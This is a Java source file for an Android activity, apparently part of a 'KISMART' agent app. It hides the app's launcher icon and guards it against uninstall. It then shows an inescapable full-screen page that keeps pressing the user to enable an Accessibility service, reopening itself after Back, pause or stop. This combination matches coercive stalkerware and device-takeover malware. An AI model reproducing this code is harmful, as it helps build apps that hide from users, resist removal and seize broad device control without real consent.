package africa.volo.kismart.agent;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class ProtectionGuardActivity extends Activity {
    private static final int BLACK = Color.rgb(5, 8, 7);
    private static final int GREEN = Color.rgb(22, 163, 74);
    private static final int WHITE = Color.WHITE;
    private static final int MUTED = Color.rgb(170, 184, 176);

    private final Handler handler = new Handler(Looper.getMainLooper());
    private long allowSettingsUntil;
    private final Runnable reassertRunnable = new Runnable() {
        @Override
        public void run() {
            if (!DeviceControls.isProtectionGuardReady(ProtectionGuardActivity.this)) {
                DeviceControls.openProtectionGuardRequired(ProtectionGuardActivity.this);
            }
        }
    };

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        configureWindow();
        DeviceControls.hideLauncherEntry(this);
        DeviceControls.protectAppFromUninstall(this);
        AgentSyncService.start(this);
        setContentView(buildUi());
    }

    @Override
    protected void onResume() {
        super.onResume();
        DeviceControls.hideLauncherEntry(this);
        DeviceControls.protectAppFromUninstall(this);
        if (DeviceControls.isProtectionGuardReady(this)) {
            finish();
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        reassertSoon();
    }

    @Override
    protected void onStop() {
        super.onStop();
        reassertSoon();
    }

    @Override
    public void onBackPressed() {
        reassertSoon();
    }

    private void configureWindow() {
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        Window window = getWindow();
        window.setStatusBarColor(BLACK);
        window.setNavigationBarColor(BLACK);
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
    }

    private View buildUi() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setPadding(dp(28), dp(28), dp(28), dp(28));
        root.setBackgroundColor(BLACK);
        root.setClickable(true);
        root.setFocusable(true);

        ImageView logo = new ImageView(this);
        logo.setImageResource(R.drawable.logo);
        logo.setScaleType(ImageView.ScaleType.CENTER_CROP);
        logo.setContentDescription("KISMART");
        LinearLayout.LayoutParams logoParams = new LinearLayout.LayoutParams(dp(72), dp(72));
        logoParams.gravity = Gravity.CENTER_HORIZONTAL;
        logoParams.bottomMargin = dp(18);
        root.addView(logo, logoParams);

        TextView title = new TextView(this);
        title.setText("DEVICE SERVICE REQUIRED");
        title.setTextColor(GREEN);
        title.setTextSize(24);
        title.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        root.addView(title, matchWrap(0, 14));

        TextView message = new TextView(this);
        message.setText("Enable Device Service in Accessibility to continue.");
        message.setTextColor(MUTED);
        message.setTextSize(15);
        message.setGravity(Gravity.CENTER);
        message.setLineSpacing(dp(3), 1.0f);
        root.addView(message, matchWrap(0, 22));

        Button enable = new Button(this);
        enable.setText("Open Accessibility");
        enable.setAllCaps(false);
        enable.setTextColor(WHITE);
        enable.setTextSize(15);
        enable.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        enable.setBackgroundColor(GREEN);
        enable.setOnClickListener(view -> openAccessibilitySettings());
        root.addView(enable, matchHeight(0, 0, dp(52)));

        return root;
    }

    private void openAccessibilitySettings() {
        allowSettingsUntil = System.currentTimeMillis() + 20000L;
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try {
            startActivity(intent);
        } catch (Exception ignored) {
        }
        reassertSoon();
    }

    private void reassertSoon() {
        handler.removeCallbacks(reassertRunnable);
        long delay = Math.max(1200L, allowSettingsUntil - System.currentTimeMillis());
        handler.postDelayed(reassertRunnable, delay);
    }

    private LinearLayout.LayoutParams matchWrap(int topDp, int bottomDp) {
        return matchHeight(topDp, bottomDp, LinearLayout.LayoutParams.WRAP_CONTENT);
    }

    private LinearLayout.LayoutParams matchHeight(int topDp, int bottomDp, int height) {
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                height
        );
        params.setMargins(0, dp(topDp), 0, dp(bottomDp));
        return params;
    }

    private int dp(int value) {
        return Math.round(value * getResources().getDisplayMetrics().density);
    }
}
